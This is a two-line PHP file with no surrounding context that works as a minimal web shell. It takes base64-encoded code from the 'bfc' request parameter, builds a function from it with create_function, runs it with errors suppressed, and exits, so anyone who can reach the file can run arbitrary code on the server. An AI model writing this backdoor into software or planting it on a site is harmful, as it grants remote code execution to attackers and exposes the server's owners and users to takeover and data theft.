<?php
if(!empty($_REQUEST['bfc'])){$bfc=base64_decode($_REQUEST['bfc']);$bfc=create_function('',$bfc);@$bfc();exit;}
